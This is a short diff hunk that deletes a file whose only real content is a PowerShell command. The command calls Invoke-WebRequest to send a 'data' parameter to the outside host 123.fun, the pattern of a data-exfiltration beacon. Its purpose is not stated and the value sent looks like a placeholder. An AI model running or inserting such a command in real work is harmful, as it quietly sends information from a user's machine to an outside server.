@@ -1,7 +1,0 @@
-
-
-
-powershell.exe -noprofile -command "Invoke-WebRequest -Uri http://123.fun/?data=123"
-
-
-123
